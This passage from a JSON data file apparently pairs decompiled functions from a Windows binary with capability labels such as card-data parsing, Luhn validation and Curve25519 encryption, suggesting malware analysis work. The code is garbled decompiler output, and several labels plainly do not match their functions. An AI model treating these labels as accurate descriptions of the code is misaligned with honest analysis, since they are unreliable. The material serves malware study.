0x403870;\n                fcn.004013f0(*(puVar13 + -0x20), *(puVar13 + -0x1c), *(puVar13 + -0x18), *(puVar13 + -0x14));\n                if ((puVar13 + -0x20 < 0xffffffc0 && puVar13 != 0xffffffe0) &&\n                   (*(puVar13 + 0x1c) = puVar16,  puVar13 + -0x20 >= 0xffffffc0 || puVar13 == 0xffffffe0)) {\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n                *(puVar13 + 0x1c) = 6;\n                *(puVar13 + 0x18) = 0x420654;\n                *(puVar13 + 0x14) = 9;\n                *(puVar13 + 0x10) = 0x420920;\n                *(puVar13 + 0xc) = 0x403890;\n                fcn.004013f0(*(puVar13 + 0x10), *(puVar13 + 0x14), *(puVar13 + 0x18), *(puVar13 + 0x1c));\n                *(puVar13 + 0x1c) = extraout_ECX_02;\n                *(puVar13 + 0x18) = extraout_EDX_00;\n                *(puVar13 + 0x1c) = 0xc;\n                *(puVar13 + 0x18) = 0x42065c;\n                *(puVar13 + 0x14) = 9;\n                *(puVar13 + 0x10) = 0x420920;\n                *(puVar13 + 0xc) = 0x4038b5;\n                uVar7 = fcn.004013f0(*(puVar13 + 0x10), *(puVar13 + 0x14), *(puVar13 + 0x18), *(puVar13 + 0x1c));\n                *(puVar13 + 0x1c) = extraout_EDX_01;\n                *(puVar13 + 0x18) = uVar2;\n                bVar17 = (uVar7 & 0x11cb) == 0;\n                uVar24 = (POPCOUNT(uVar7 & 0xcb) & 1U) == 0;\n                uVar3 = *(puVar13 + 0x18);\n                *(puVar13 + 0x1c) = 0xc;\n                *(puVar13 + 0x18) = 0x420668;\n                *(puVar13 + 0x14) = 9;\n                *(puVar13 + 0x10) = 0x420920;\n                *(puVar13 + 0xc) = 0x4038e9;\n                fcn.004013f0(*(puVar13 + 0x10), *(puVar13 + 0x14), *(puVar13 + 0x18), *(puVar13 + 0x1c));\n                puVar14 = puVar13 + 0x10;\n                if ((!bVar17) && (puVar14 = puVar13 + 0x10,  bVar17)) {\n                    puVar16 = puVar13 + 0xc;\n                    *(puVar13 + 0xc) = 0x6ae181d0;\n                    puVar10 = 0x6ae181d0;\n                    cVar1 = '\\x10';\n                    do {\n                        puVar10 = puVar10 + -1;\n                        puVar16 = puVar16 + -1;\n                        *puVar16 = *puVar10;\n                        cVar1 = cVar1 + -1;\n                    } while ('\\0' < cVar1);\n                    *(puVar13 + -0x38) = puVar13 + 0xc;\n                    puVar14 = puVar13 + -0x5e53;\n                }\n                *(puVar14 + -4) = 0x2a;\n                *(puVar14 + -8) = 0x4206a0;\n                *(puVar14 + -0xc) = 9;\n                puVar15 = puVar14 + -0x10;\n                *(puVar14 + -0x10) = 0x420920;\n                *(puVar14 + -0x14) = 0x40390b;\n                iVar8 = fcn.004013f0(*(puVar14 + -0x10), *(puVar14 + -0xc), *(puVar14 + -8), *(puVar14 + -4));\n                if ((uVar24) || (*(puVar14 + -0x14) = uVar3,  !uVar24)) {\n                    *(puVar14 + -0x14) = 0xb;\n                    *(puVar14 + -0x18) = 0x4206cc;\n                    puVar15 = puVar14 + -0x1c;\n                    *(puVar14 + -0x1c) = 9;\n                }\n                *(puVar15 + -1) = in_ES;\n                *(iVar8 + 10) = *(iVar8 + 10) + extraout_CH_00;\n                puVar15[-2] = 0x420920;\n                puVar15[-3] = 0x403935;\n                fcn.004013f0(puVar15[-2], puVar15[-1], *puVar15, puVar15[1]);\n                puVar15[-3] = 0x41;\n                puVar15[-4] = 0x420728;\n                puVar15[-5] = 9;\n                puVar15[-6] = 0x420920;\n                puVar15[-7] = 0x403948;\n                fcn.004013f0(puVar15[-6], puVar15[-5], puVar15[-4], puVar15[-3]);\n                puVar15[9] = 0x33;\n                puVar15[8] = 0x42076c;\n                puVar15[7] = 9;\n                puVar15[6] = 0x420920;\n                puVar15[5] = 0x40395e;\n                fcn.004013f0(puVar15[6], puVar15[7], puVar15[8], puVar15[9]);\n                puVar15[5] = 0x4b;\n                puVar15[4] = 0x4207a0;\n                puVar15[3] = 9;\n                puVar15[2] = 0x420920;\n                puVar15[1] = 0x403971;\n                fcn.004013f0(puVar15[2], puVar15[3], puVar15[4], puVar15[5]);\n                puVar15[1] = 0x39;\n                *puVar15 = 0x4207ec;\n                puVar15[-1] = 9;\n                puVar15[-2] = 0x420920;\n                puVar15[-3] = 0x403984;\n                fcn.004013f0(puVar15[-2], puVar15[-1], *puVar15, puVar15[1]);\n                puVar15[-3] = 8;\n                puVar15[-4] = 0x420828;\n                puVar15[-5] = 9;\n                puVar15[-6] = 0x420920;\n                puVar15[-7] = 0x403997;\n                fcn.004013f0(puVar15[-6], puVar15[-5], puVar15[-4], puVar15[-3]);\n                puVar15[9] = 0x14;\n                puVar15[8] = 0x420830;\n                puVar15[7] = 9;\n                puVar15[6] = 0x420920;\n                puVar15[5] = 0x4039ad;\n                uVar3 = fcn.004013f0(puVar15[6], puVar15[7], puVar15[8], puVar15[9]);\n                return uVar3;\n            }\n            *(puVar13 + -0x12) = puVar16;\n            puVar16 = puVar16 & 0xffff0000 | *(puVar13 + -0x12);\n            if (!uVar24 && !uVar21) goto code_r0x0040385d;\n            if (!uVar25) {\n                *(puVar13 + -0x14) = in_CS;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        uVar24 = puVar12 + 1 < *puVar5;\n        uVar25 = SCARRY4(puVar5, 1);\n        uVar21 = puVar5 == 0xffffffff;\n        puVar11 = puVar12 + -1;\n        *(puVar12 + -1) = 0xb7f8c08b;\n        if (uVar24 || uVar21) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    } while( true );\n}\n",
        "token_count": 6223
    },
    "004039c0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403d56) overlaps instruction at (ram,0x00403d4d)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.004039c0(void)\n\n{\n    char *pcVar1;\n    int32_t *piVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    uint32_t in_EAX;\n    uint *puVar5;\n    int32_t iVar6;\n    ushort extraout_CX;\n    uint16_t extraout_CX_00;\n    uint32_t extraout_ECX;\n    uint8_t extraout_CH;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    int32_t extraout_ECX_04;\n    uint extraout_ECX_05;\n    uint extraout_ECX_06;\n    uint8_t *extraout_EDX;\n    uint extraout_EDX_00;\n    uint extraout_EDX_01;\n    uint extraout_EDX_02;\n    uint16_t uVar7;\n    uint16_t uVar8;\n    uint32_t unaff_EBX;\n    uint32_t uVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    uint *puVar16;\n    uint uVar17;\n    uint *unaff_ESI;\n    uint uVar18;\n    uint32_t uVar19;\n    uint *puVar20;\n    uint uVar21;\n    uint uVar22;\n    uint *puVar23;\n    ushort in_ES;\n    uint16_t in_SS;\n    bool bVar24;\n    uint8_t in_AF;\n    bool bVar25;\n    uchar uVar26;\n    uchar uVar27;\n    char cVar28;\n    char cVar29;\n    uchar uVar30;\n    ulong uVar31;\n    uint8_t uStackY84;\n    uint32_t in_stack_ffffffec;\n    \n    puVar20 = in_stack_ffffffec & 0xffff0000 | in_SS;\n    bVar24 = false;\n    bVar25 = (in_EAX & 0x116a18c5) == 0;\n    uVar8 = in_SS;\n    fcn.004013f0(0x420920, 9, 0x420414, 0x47);\n    if (!bVar24 && !bVar25) {\n        unaff_EBX = unaff_EBX & 0xffff00ff;\n    }\n    fcn.004013f0(0x420920, 9, 0x420674, 0xf);\n    bVar24 = false;\n    bVar25 = (in_SS + 0x2562 & 0xffffff00 | in_SS + 0x2562 | 0x4c | extraout_ECX) == 0;\n    uVar31 = fcn.004013f0(0x420920, 9, 0x420684, 0x1a);\n    puVar23 = uVar31;\n    if (!bVar24 && !bVar25) {\n        unaff_EBX = unaff_EBX & 0xffff00ff;\n    }\n    *puVar20 = *unaff_ESI;\n    *(puVar23 + -1) = in_ES;\n    pcVar1 = (uVar31 >> 0x20) + 10;\n    *pcVar1 = *pcVar1 + (extraout_CH | uStackY84);\n    puVar23[-2] = 0x420920;\n    puVar23[-3] = 0x403a6b;\n    fcn.004013f0(puVar23[-2], puVar23[-1], *puVar23, puVar23[1]);\n    puVar23[5] = puVar20 + 1;\n    uVar21 = puVar23[5];\n    puVar23[5] = 0xb;\n    puVar23[4] = 0x4206e4;\n    puVar23[3] = 9;\n    puVar23[2] = 0x420920;\n    puVar23[1] = 0x403a9c;\n    uVar31 = fcn.004013f0(puVar23[2], puVar23[3], puVar23[4], puVar23[5]);\n    puVar23[5] = uVar31;\n    puVar23[4] = extraout_ECX_00;\n    puVar23[3] = uVar31 >> 0x20;\n    puVar23[2] = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n    puVar23[1] = puVar23 + 6;\n    *puVar23 = 0x6ae181d0;\n    puVar23[-1] = unaff_ESI + 1;\n    puVar23[-2] = uVar21;\n    iVar4 = uVar31;\n    cVar29 = SCARRY2(iVar4, 1);\n    cVar28 = iVar4 + 1 < 0;\n    bVar24 = iVar4 == -1;\n    uVar22 = puVar23[-2];\n    uVar18 = puVar23[-1];\n    uVar17 = *puVar23;\n    uVar21 = puVar23[2];\n    puVar23[5] = 8;\n    puVar23[4] = 0x4206f0;\n    puVar23[3] = 9;\n    puVar10 = puVar23 + 2;\n    puVar23[2] = 0x420920;\n    puVar23[1] = 0x403ab9;\n    fcn.004013f0(puVar23[2], puVar23[3], puVar23[4], puVar23[5]);\n    if ((bVar24 || cVar29 != cVar28) || (!bVar24 && cVar29 == cVar28)) {\n        puVar10 = puVar23 + 1;\n        puVar23[1] = 9;\n    }\n    puVar10[-1] = 0x4206f8;\n    puVar10[-2] = 9;\n    puVar10[-3] = 0x420920;\n    puVar10[-4] = 0x403ada;\n    uVar31 = fcn.004013f0(puVar10[-3], puVar10[-2], puVar10[-1], *puVar10);\n    puVar10[4] = uVar31;\n    puVar10[3] = extraout_ECX_01;\n    puVar10[2] = uVar31 >> 0x20;\n    puVar10[1] = uVar21;\n    *puVar10 = puVar10 + 5;\n    puVar10[-1] = uVar17;\n    puVar10[-2] = uVar18;\n    puVar10[-3] = uVar22;\n    uVar21 = puVar10[-3];\n    uVar19 = puVar10[-2];\n    uVar9 = puVar10[1];\n    puVar10[4] = 9;\n    puVar10[3] = 0x420704;\n    puVar10[2] = 9;\n    puVar10[1] = 0x420920;\n    *puVar10 = 0x403aff;\n    fcn.004013f0(puVar10[1], puVar10[2], puVar10[3], puVar10[4]);\n    *(puVar10 + 0x12) = uVar9;\n    *(puVar10 + 4) = uVar19;\n    puVar10[3] = uVar21;\n    puVar20 = uVar19 & 0xffff0000 | *(puVar10 + 4);\n    uVar7 = *(puVar10 + 0x12);\n    puVar10[4] = 9;\n    puVar10[3] = 0x420710;\n    puVar10[2] = 9;\n    puVar10[1] = 0x420920;\n    *puVar10 = 0x403b28;\n    uVar21 = fcn.004013f0(puVar10[1], puVar10[2], puVar10[3], puVar10[4]);\n    puVar10[4] = uVar21;\n    puVar10[4] = 0xc;\n    puVar10[3] = 0x42071c;\n    puVar10[2] = 9;\n    puVar10[1] = 0x420920;\n    *puVar10 = 0x403b56;\n    uVar3 = fcn.004013f0(puVar10[1], puVar10[2], puVar10[3], puVar10[4]);\n    puVar10[4] = extraout_ECX_02;\n    uVar3 = extraout_ECX_02 >> 8 & uVar3 ^ 6;\n    uVar26 = uVar3 == 0;\n    bVar24 = (POPCOUNT(uVar3) & 1U) == 0;\n    puVar10[4] = 3;\n    puVar10[3] = 0x420844;\n    puVar10[2] = 9;\n    puVar11 = puVar10 + 1;\n    puVar10[1] = 0x420920;\n    *puVar10 = 0x403b81;\n    cVar28 = fcn.004013f0(puVar10[1], puVar10[2], puVar10[3], puVar10[4]);\n    if ((bVar24) || (*puVar10 = extraout_ECX_03,  !bVar24)) {\n        *puVar10 = 10;\n        puVar11 = puVar10 + -1;\n        puVar10[-1] = 0x420848;\n    }\n    else {\n        *(extraout_EDX + 10) = *(extraout_EDX + 10) + -0x68;\n        *extraout_EDX = *extraout_EDX | cVar28 - 1U;\n        uVar26 = *extraout_EDX == 0;\n    }\n    puVar11[-1] = 9;\n    puVar12 = puVar11 + -2;\n    puVar11[-2] = 0x420920;\n    puVar11[-3] = 0x403ba0;\n    fcn.004013f0(puVar11[-2], puVar11[-1], *puVar11, puVar11[1]);\n    if ((uVar26) || (*(puVar11 + -10) = extraout_CX,  !uVar26)) {\n        puVar12 = puVar11 + -3;\n        puVar11[-3] = 0x1b;\n    }\n    *(puVar12 + -4) = uVar8;\n    puVar23 = *(puVar12 + -4);\n    *(puVar12 + -4) = 0x47;\n    *(puVar12 + -8) = 0x420854;\n    *(puVar12 + -0xc) = 9;\n    *(puVar12 + -0x10) = 0x420920;\n    *(puVar12 + -0x14) = 0x403bc4;\n    uVar21 = fcn.004013f0(*(puVar12 + -0x10), *(puVar12 + -0xc), *(puVar12 + -8), *(puVar12 + -4));\n    *(puVar12 + 0x1c) = uVar21;\n    uVar26 = false;\n    uVar30 = 0;\n    uVar27 = uVar21 == uVar7;\n    *(puVar12 + 0x1c) = 0x12;\n    *(puVar12 + 0x18) = 0x420870;\n    *(puVar12 + 0x14) = 9;\n    *(puVar12 + 0x10) = 0x420920;\n    *(puVar12 + 0xc) = 0x403bdf;\n    puVar5 = fcn.004013f0(*(puVar12 + 0x10), *(puVar12 + 0x14), *(puVar12 + 0x18), *(puVar12 + 0x1c));\n    if ((uVar26 || uVar27) || (!uVar26 && !uVar27)) {\n        puVar5 = puVar12 + 0xc;\n        *(puVar12 + 0xc) = 0x40;\n    }\n    else {\n        uVar26 = 0;\n        *puVar23 = *puVar20;\n        uVar7 = CONCAT11(0xdf, uVar7);\n        uVar30 = SCARRY4(puVar12 + 0x10, 1);\n        uVar27 = puVar12 == 0xffffffef;\n        puVar20 = puVar20 + 1;\n        puVar23 = puVar23 + 1;\n    }\n    uVar9 = uVar9 & 0xffff0000 | uVar7;\n    puVar5[-1] = 0x420884;\n    puVar5[-2] = 9;\n    puVar5[-3] = 0x420920;\n    puVar5[-4] = 0x403c0c;\n    fcn.004013f0(puVar5[-3], puVar5[-2], puVar5[-1], *puVar5);\n    if ((!uVar30) && (puVar5[-4] = extraout_EDX_00,  uVar30)) {\n        *puVar5[-3] = puVar5[4];\n        return;\n    }\n    puVar5[-4] = 0xc;\n    puVar5[-5] = 0x4208c4;\n    puVar5[-6] = 9;\n    puVar14 = puVar5 + -7;\n    puVar5[-7] = 0x420920;\n    puVar5[-8] = 0x403c3f;\n    uVar31 = fcn.004013f0(puVar5[-7], puVar5[-6], puVar5[-5], puVar5[-4]);\n    if ((!uVar27) && (uVar27)) {\n        uVar9 = uVar9 + 1;\n        uVar3 = uVar31;\n        if (uVar26 || uVar9 == 0) {\n            if (extraout_ECX_04 + -1 != 0 && uVar3 != 0x98) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            pcVar1 = (uVar31 >> 0x20) + 10;\n            *pcVar1 = *pcVar1 + (extraout_ECX_04 + -1 >> 8);\n            goto code_r0x00403ca0;\n        }\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        piVar2 = (uVar31 & 0xffff0000 | CONCAT11((uVar31 >> 8) + in_AF, uVar3 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar2 = *piVar2 - uVar9;\n        puVar20 = puVar20 + 1;\n    }\n    puVar5[-8] = 0xb;\n    puVar5[-9] = 0x4208d0;\n    puVar5[-10] = 9;\n    puVar5[-0xb] = 0x420920;\n    puVar5[-0xc] = 0x403c66;\n    fcn.004013f0(puVar5[-0xb], puVar5[-10], puVar5[-9], puVar5[-8]);\n    *(puVar5 + 0x12) = uVar9;\n    *(puVar5 + 0xe) = extraout_EDX_01;\n    *(puVar5 + 10) = puVar23;\n    cVar29 = '\\0';\n    uVar8 = uVar9 ^ extraout_CX_00;\n    cVar28 = uVar8 < 0;\n    bVar24 = uVar8 == 0;\n    puVar23 = *(puVar5 + 10);\n    puVar5[4] = 4;\n    puVar5[3] = 0x4208dc;\n    puVar5[2] = 9;\n    puVar5[1] = 0x420920;\n    *puVar5 = 0x403c89;\n    fcn.004013f0(puVar5[1], puVar5[2], puVar5[3], puVar5[4]);\n    if ((bVar24 || cVar29 != cVar28) || (puVar13 = puVar5 + 1,  !bVar24 && cVar29 == cVar28)) {\n        *puVar5 = 4;\n        puVar13 = puVar5;\n    }\n    *(puVar13 + -4) = 0x4208e0;\n    puVar14 = puVar13 + -8;\n    *(puVar13 + -8) = 9;\ncode_r0x00403ca0:\n    puVar14[-1] = 0x420920;\n    puVar14[-2] = 0x403caa;\n    uVar21 = fcn.004013f0(puVar14[-1], *puVar14, puVar14[1], puVar14[2]);\n    *(puVar14 + 0x1a) = puVar23;\n    *(puVar14 + 0x16) = uVar21;\n    *(puVar14 + 0x12) = extraout_ECX_05;\n    uVar8 = *(puVar14 + 0x1a);\n    puVar14[6] = 0xc;\n    puVar14[5] = 0x4208e4;\n    puVar14[4] = 9;\n    puVar14[3] = 0x420920;\n    puVar14[2] = 0x403cd5;\n    uVar21 = fcn.004013f0(puVar14[3], puVar14[4], puVar14[5], puVar14[6]);\n    puVar14[6] = uVar21;\n    puVar14[6] = 4;\n    puVar14[5] = 0x4208f0;\n    puVar14[4] = 9;\n    puVar14[3] = 0x420920;\n    puVar14[2] = 0x403cf1;\n    uVar21 = fcn.004013f0(puVar14[3], puVar14[4], puVar14[5], puVar14[6]);\n    puVar14[6] = uVar21;\n    uVar26 = 0;\n    bVar24 = false;\n    puVar14[6] = 9;\n    puVar14[5] = 0x4208f4;\n    puVar14[4] = 9;\n    puVar15 = puVar14 + 3;\n    puVar14[3] = 0x420920;\n    puVar14[2] = 0x403d1c;\n    iVar6 = fcn.004013f0(puVar14[3], puVar14[4], puVar14[5], puVar14[6]);\n    if ((bVar24) || (puVar14[2] = extraout_ECX_06,  !bVar24)) {\n        puVar14[2] = 0x16;\n        puVar15 = puVar14 + 1;\n        puVar14[1] = 0x420900;\n    }\n    else {\n        *(puVar23 & 0xffff0000 | uVar8) = *puVar20;\n        uVar26 = 0;\n        *0x68166a = *0x68166a | iVar6 + 1U;\n        puVar20 = puVar20 + 1;\n    }\n    puVar15[-1] = 9;\n    puVar15[-2] = 0x420920;\n    puVar15[-3] = 0x403d3d;\n    fcn.004013f0(puVar15[-2], puVar15[-1], *puVar15, puVar15[1]);\n    if ((uVar26) || (puVar15[-3] = extraout_EDX_02,  !uVar26)) {\n        puVar16 = puVar15 + -3;\n        puVar15[-3] = 7;\n    }\n    else {\n        *(puVar20 + 0x43d1773a) = *(puVar20 + 0x43d1773a) ^ 0x6a27e95e;\n        puVar16 = puVar15 + -1;\n    }\n    puVar16[-1] = 0x420918;\n    puVar16[-2] = 9;\n    puVar16[-3] = 0x420920;\n    puVar16[-4] = 0x403d69;\n    fcn.004013f0(puVar16[-3], puVar16[-2], puVar16[-1], *puVar16);\n    return;\n}\n",
        "token_count": 4830
    },
    "004021d0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402210) overlaps instruction at (ram,0x0040220d)\n// \n\nint32_t __cdecl fcn.004021d0(int32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    ushort in_CX;\n    ushort in_SS;\n    uint32_t uStack20;\n    \n    uStack20 = CONCAT22(in_CX, in_SS);\n    puVar1 = arg_ch + -0x3f7af3a3;\n    uVar2 = *puVar1;\n    *puVar1 = *puVar1 + in_CX;\n    if (!CARRY1(uVar2, in_CX) && *puVar1 != 0) {\n        arg_8h = arg_10h;\n        do {\n            uStack20 = uStack20 + *arg_ch;\n            if (uStack20 >> 0x10 != 0) {\n                uStack20 = (uStack20 >> 0x10) + (uStack20 & 0xffff);\n            }\n            arg_ch = arg_ch + 1;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return (uStack20 >> 0x10) + uStack20;\n}\n",
        "token_count": 311
    },
    "004030e0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403158) overlaps instruction at (ram,0x00403153)\n// \n\nvoid __cdecl fcn.004030e0(uint32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    char cVar5;\n    uint32_t arg_10h_00;\n    uint32_t uVar4;\n    int32_t extraout_ECX;\n    char *pcVar6;\n    uint8_t unaff_BL;\n    uchar *puVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    uint8_t uVar10;\n    bool bVar11;\n    uint8_t in_AF;\n    ulong uVar12;\n    uint32_t uVar13;\n    \n    puVar7 = &stack0xfffffffc;\n    arg_10h_00 = arg_ch + 1U >> 1;\n    uVar12 = fcn.004021d0(0, arg_8h, arg_10h_00);\n    pcVar6 = uVar12 >> 0x20;\n    uVar4 = uVar12;\n    puVar8 = uVar4 & 0xffff;\n    uVar10 = 0;\n    bVar11 = (POPCOUNT(uVar4 & 0xff) & 1U) != 0;\n    uVar13 = arg_8h;\n    if ((bVar11) && (uVar3 = puVar8 << 0x10,  !bVar11)) {\n        puVar2 = puVar8 + 1;\n        out(*puVar8, uVar12 >> 0x20);\n        uVar10 = in_AF;\n        do {\n            cVar5 = uVar4 >> 8;\n            uVar10 = 9 < (uVar4 & 0xf) | uVar10;\n            uVar4 = CONCAT31(CONCAT21(uVar4 >> 0x10, cVar5 - uVar10), -uVar10);\n            puVar8 = puVar2;\n            uVar13 = arg_10h_00 & 0xffff | uVar3;\n        } while (uVar10 || cVar5 == *pcVar6);\n    }\n    piVar1 = arg_8h + pcVar6 * 2;\n    *piVar1 = (*piVar1 + 0x7b) - uVar10;\n    *(extraout_ECX + 0x57) = uVar4;\n    uVar12 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(uVar13);\n    bVar11 = (POPCOUNT(unaff_BL & 0x4d) & 1U) == 0;\n    uVar4 = *(uVar12 + 0x58);\n    if ((bVar11) || (!bVar11)) {\n        bVar11 = puVar8 < uVar4;\n    }\n    else {\n        puVar8 = 0x34a96cf4;\n        uVar4 = (uVar12 >> 0x20) + 1;\n        puVar7 = *0x6617b43a;\n        bVar11 = 0x34a96cf4 < uVar4;\n    }\n    if (bVar11) {\n        iVar9 = (puVar8 - uVar4 & 0xffff) - 1;\n    }\n    else {\n        iVar9 = puVar8 - (uVar4 & 0xffff);\n    }\n    if (iVar9 < uVar4 >> 0x10) {\n        iVar9 = (iVar9 - (uVar4 >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar9 = iVar9 - (uVar4 >> 0x10);\n    }\n    bVar11 = SCARRY4(iVar9, *(puVar7 + 0xc));\n    **(puVar7 + 0x14) = iVar9 + *(puVar7 + 0xc);\n    if ((!bVar11) && (bVar11)) {\n        LOCK();\n    }\n    **(puVar7 + 0x10) = *(*(puVar7 + 8) + 0x58);\n    return;\n}\n",
        "token_count": 951
    },
    "00402800": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402800(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (((iVar3 == 0) && (iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar3 != 0x420)) &&\n       (iVar3 = (*pcVar1)(),  iVar3 != 0x422)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 236
    },
    "00403060": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403060(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_ch == 1) {\n        fcn.00403240();\n        fcn.004023f0();\n        if (*0x42093c == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00404280();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 136
    },
    "00402d50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00402d50(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00403060;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x410410;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "00403f60": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403f49) overlaps instruction at (ram,0x00403f45)\n// \n// WARNING: Removing unreachable block (ram,0x00403fd9)\n// WARNING: Removing unreachable block (ram,0x00403feb)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar ** __cdecl fcn.00403f60(char **arg_8h, int32_t arg_ch, char *arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint8_t *puVar4;\n    char **ppcVar5;\n    uint32_t uVar6;\n    char **unaff_ESI;\n    char **ppcVar7;\n    char **unaff_EDI;\n    char **ppcVar8;\n    char **ppcVar9;\n    uint8_t in_AF;\n    bool bVar10;\n    \n    ppcVar5 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == 0) {\n        return arg_8h;\n    }\n    if ((0 < arg_14h) && (arg_14h < 1)) {\n        uVar3 = arg_14h;\n        uVar1 = 9 < (uVar3 & 0xf) | in_AF;\n        if (arg_ch == 0) {\n            puVar4 = (arg_14h & 0xffff0000 | CONCAT11((arg_14h >> 8) + uVar1, uVar3 + uVar1 * '\\x06') & 0xff0f) + 1;\n            *unaff_EDI = *unaff_EDI + -1;\n            *(puVar4 * 2) = uVar3;\n            uVar1 = *puVar4;\n            *puVar4 = *puVar4 + puVar4;\n            if (CARRY1(uVar1, puVar4) || *puVar4 == 0) {\n                *unaff_EDI = *unaff_ESI;\n                unaff_EDI = unaff_EDI + 1;\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n            return unaff_EDI;\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    bVar10 = SBORROW4(arg_8h, ppcVar5);\n    iVar2 = arg_8h - ppcVar5;\n    if (arg_8h <= ppcVar5) {\n        do {\n            ppcVar9 = unaff_EDI;\n            if ((bVar10 == iVar2 < 0) && (bVar10 != iVar2 < 0)) {\n                out(0xc4, arg_8h);\n                arg_10h = arg_10h & 0xffffff00 | arg_10h ^ ppcVar5;\n                ppcVar9 = unaff_EDI + 1;\n                *unaff_EDI = arg_8h;\n            }\n            if (*arg_8h == *arg_10h) {\n                bVar10 = true;\n                ppcVar8 = arg_10h + 1;\n                uVar6 = arg_14h;\n                ppcVar7 = arg_8h;\n                do {\n                    ppcVar7 = ppcVar7 + 1;\n                    uVar6 = uVar6 - 1;\n                    ppcVar9 = ppcVar8;\n                    if (uVar6 == 0) break;\n                    ppcVar9 = ppcVar8 + 1;\n                    bVar10 = *ppcVar7 == *ppcVar8;\n                    ppcVar8 = ppcVar9;\n                } while (bVar10);\n                if (bVar10) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n            bVar10 = SBORROW4(arg_8h, ppcVar5);\n            iVar2 = arg_8h - ppcVar5;\n            unaff_EDI = ppcVar9;\n        } while (arg_8h < ppcVar5 || iVar2 == 0);\n    }\n    return NULL;\n}\n",
        "token_count": 947
    },
    "00401000": {
        "rules": [
